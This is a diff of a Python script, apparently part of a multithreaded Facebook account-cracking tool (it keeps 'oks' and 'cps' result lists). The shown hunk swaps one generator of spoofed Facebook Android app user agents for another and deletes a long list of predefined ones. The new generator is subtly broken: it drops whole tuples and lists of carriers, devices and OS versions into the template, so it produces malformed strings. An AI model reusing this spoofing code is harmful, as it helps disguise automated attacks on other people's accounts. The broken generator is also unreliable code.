@@ -29,251 +29,170 @@ from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 #-----------------------❲ LOOP ❳-----------------------#
 totaldmp = 0;count = 0;loop = 0;oks = [];cps = [];id = [];ps = [];sid = [];total=[];methods = [];srange = 0;saved = [];totaldmp = 0;filter = [];user=[]
-#-----------------------❲ GRAPH & API USER AGENT ❳-----------------------user0port random
+#-----------------------❲ GRAPH & API USER AGENT ❳-----------------------#
 import random
 
-def generate_random_user_agent():
-    android_versions = ['5.0.1', '8.0.0', '9.0.1', '4.4.4', '8.1.0', '5.1.1', '7.1.2', '9', '7.0', '10', '7.1.1', '4.0.4']
-    devices = [
-        "GT-I9505", "Hisense-Hi-3", "SM-A515F", "ATU-L31", "HUAWEI LUA-L21", "Lenovo A6020a46", "FIG-LX1", "Kirin Treble", 
-        "SM-S111DL", "SM-J410", "YAL-L21", "925F", "SM-G930F", "SM-J210F", "SM-A720F", "Z987", "MI 5X", "SM-G950U",
-        "SM-G925F", "SM-N9005", "CPH1909", "SM-A205GN", "SM-A505GN", "AGS2-L09", "LML713DL", "LML414DL", "CPH1987", 
-        "Hisense Hi 3", "LM-V405", "vivo V3Max", "POT-LX1", "SM-N975U", "SM-N960F", "A37f", "moto e6", "SM-G955F", 
-        "DRA-LX2", "E6653", "GT-I9300"]
-    manufacturers = ["samsung", "zte", "Xiaomi", "OPPO", "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"]
-    brands = ["samsung", "zte", "Xiaomi", "OPPO", "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"]
-    densities = ['3.0', '1.75', '2.0', '2.625', '3.5', '1.5', '4.0']
-    languages = ["en_US", "fr_FR", "th_TH", "es_MX", "en_EG", "en_PH", "hu_HU", "vi_VN", "en_GB", "en_ZA", "tr_TR"]
-    carriers = [
+def generate_random_user2_agent():
+    user_agent_template = (
+        '[FBAN/FB4A;FBAV/{version};FBBV/{version_code};FBDM/{device_density};FBLC/{language};FBRV/{revision};'
+        'FBCR/{carrier};FBMF/{manufacturer};FBBD/{brand};FBPN/{package};FBDV/{device};FBSV/{os_version};'
+        'FBOP/{op};FBCA/{cpu_architecture};SIM/{sim_name};MODEL/{model_name};]')
+
+    version = f"{random.randint(100, 259)}.0.0.{random.randint(10, 99)}"
+    version_code = random.randint(10000000, 99999999,)
+    device_density = f"{random.choice(['3.0', '1.75', '2.0', '2.625', '3.5', '1.5', '4.0'])}"
+ # Example: Set to a specific language code  
+    language = ["en_US", "fr_FR", "th_TH", "es_MX", "en_EG", "en_PH", "hu_HU", "vi_VN", "en_GB", "en_ZA", "tr_TR"]
+  # Example: Set revision number if applicable
+    revision = "190301973"
+   # Example: Set carrier name
+    carrier = "PosteMobile","O2-CZ","airtel","Beeline","MegaFon","T-Mobile","Tele2 LT","Three","Beeline","MegaFon"
+
+    manufacturer = "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"
+    brand = ["samsung", "zte", "Xiaomi", "OPPO"]
+    package = "com.facebook.katana"
+    device = ("GT-I9505", "Hisense-Hi-3", "SM-A515F", "ATU-L31", "HUAWEI LUA-L21", "Lenovo A6020a46", "FIG-LX1", "Kirin Treble", 
+       "SM-S111DL", "SM-J410", "YAL-L21", "925F", "SM-G930F", "SM-J210F", "SM-A720F", "Z987", "MI 5X", "SM-G950U",
+       "SM-G925F", "SM-N9005", "CPH1909", "SM-A205GN", "SM-A505GN", "AGS2-L09", "LML713DL", "LML414DL", "CPH1987", 
+       "Hisense Hi 3", "LM-V405", "vivo V3Max", "POT-LX1", "SM-N975U", "SM-N960F", "A37f", "moto e6", "SM-G955F", 
+       "DRA-LX2", "E6653", "GT-I9300")
+    os_version = '5.0.1', '8.0.0', '9.0.1', '4.4.4', '8.1.0', '5.1.1', '7.1.2', '9', '7.0', '10', '7.1.1', '4.0.4'
+    op = 20
+    cpu_architecture = "x86:armeabi-v7a"
+
+    # Randomly select SIM name and model name
+    sim_name = random.choice([
         "Banglalink", "Robi", "MTN-CG", "Grameenphone", "Artel", "Teletalk", "UMobaile", "Digi",
         "Bouygues Telecom", "MegaFon", "Viettel Telecom", "TM", "GLOBE", "TELCEL", "TelkomSA",
-        "U.S. Cellular", "null", "VIETTEL", "Verizon", "O2-CZ", "Metro by T-Mobile", "SUN"]
+        "U.S. Cellular", "null", "VIETTEL", "Verizon", "O2-CZ", "Metro by T-Mobile", "SUN"])
+    model_name = random.choice([
+        "SM-G3518","SM-J320F","ASUS_Z016D","ATU-L31","SM-J530F","2499", "POCOPHONE F1", "CPH2083", "Xiaomi_Mi_Mix_10", "Redmi Note 7 Pro", "CPH2185", "CPH2065",
+        "CPH2197", "CPH1989", "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 8A", "MI PLAY", "OPPO A57", "CPH2145",
+        "Mi Note 10 Lite", "MI PAD 4", "F1w", "Redmi 5 Plus", "CPH1909", "CPH2065", "CPH1937", "CPH2249",
+        "CPH2095", "CPH2083", "CPH1979", "CPH2067", "CPH2015", "CPH2021", "CPH2205", "CPH2207", "CPH1909",
+        "CPH1801", "CPH1911", "CPH1901", "CPH1727", "1201", "Xiaomi"])
+    return user_agent_template.format(
+        version=version,
+        version_code=version_code,
+        device_density=device_density,
+        language=language,
+        revision=revision,
+        carrier=carrier,
+        manufacturer=manufacturer,
+        brand=brand,
+        package=package,
+        device=device,
+        os_version=os_version,
+        op=op,
+        cpu_architecture=cpu_architecture,
+        sim_name=sim_name,
+        model_name=model_name)
 
-    model_name = random.choice(devices)
-    carrier = random.choice(carriers)
-    
-    return {
-        'version': random.choice(android_versions),
-        'device_density': random.choice(densities),
-        'language': random.choice(languages),
-        'carrier': carrier,
-        'manufacturer': random.choice(manufacturers),
-        'brand': random.choice(brands),
-        'device': random.choice(devices),
-        'model_name': model_name}
-
-# Construct user_agent string using user_agent_template
-user_agent_template = "Dalvik/2.1.0 (Linux; U; Android {version}; {device_info}) [{extra_info}]"
-
-# Generate random user agent values
-user_agent_values = generate_random_user_agent()
-
-device_info = f"{user_agent_values['device']} Build/{random.choice(['R', 'S'])}{random.randint(10, 99)}NW"
-extra_info = (
-    f"FBAN/Orca-Android;FBAV/{random.randint(100, 259)}.0.0.{random.randint(10, 99)};"
-    f"FBPN/com.facebook.orca;FBLC/{user_agent_values['language']};FBBV/{random.randint(10000000, 99999999)};"
-    f"FBCR/{user_agent_values['carrier']};FBMF/{user_agent_values['manufacturer']};FBBD/{user_agent_values['brand']};"
-    f"FBDV/{user_agent_values['device']};FBSV/{user_agent_values['version']};"
-    f"FBCA/{random.choice(['armeabi-v7a', 'arm64-v8a', 'x86:armeabi'])};"
-    f"FBDM/{{density={user_agent_values['device_density']},width={random.choice(['720', '1080', '1440'])},height={random.choice(['1280', '1920', '2560'])}}};"
-    f"FB_FW/1;")
-
-# Format the user agent string
-user_agent = user_agent_template.format(
-    version=user_agent_values['version'],
-    device_info=device_info,
-    extra_info=extra_info)
-
-print(user_agent)
-    
 predefined_user_agents = [
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;]",
-    "Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]",
-    "Dalvik/2.1.0 (Linux, U; Android 7.0, Hisense Hi 3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 2391017119 FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1",
-    "Dalvik/2.1.0 (Linux, U; Android 7.0, HisenseHi3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 239.10.17.119,FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920height=1280):FB_FW/1:1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]",
-    "Dalvik/2.1.0 9Linux;U; Android 5.1.1; A37f Build/LMY47V( [FBAN/EMA;UNITY_PACKAGE/1315;FBBV/203779460;FBAV/190.0.0.6.117;FBDV/A37F;FBLC/en_US;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=976};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; W-K200 Build/O11019) [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/234444154;FBAV/209.0.0.5.119;FBDV/W-K200;FBLC/vi_VN;FBOP/20;FBNG/3G;FBCQ/UNKNOWN;FBMNT/METERED] Cookie vO4n********************",
-    "Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X00QD Build/PPR1.180610.009) [FBAN/EMA;UNITY_PACKAGE/1634;FBBV/244867833;FBAV/216.0.0.10.121;FBDV/ASUS_X00QD;FBLC/pt_BR;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
